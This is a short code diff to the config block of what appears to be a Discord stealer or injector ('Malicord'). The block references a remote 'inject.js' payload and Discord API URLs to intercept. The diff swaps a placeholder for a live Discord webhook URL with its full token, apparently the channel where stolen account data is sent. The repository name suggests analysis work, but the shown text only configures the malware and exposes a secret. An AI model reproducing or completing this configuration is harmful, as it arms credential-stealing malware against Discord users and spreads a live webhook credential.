@@ -20,7 +20,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/Inplex-sys/Malicord-Analysis/main/inject.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1530860786627514409/sWQvvvNmZDQrbfQXikyzZ3iggs2QmHIYBNYQof231USoAzU0SdOV7dx2ac_3bn5RPaNg",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
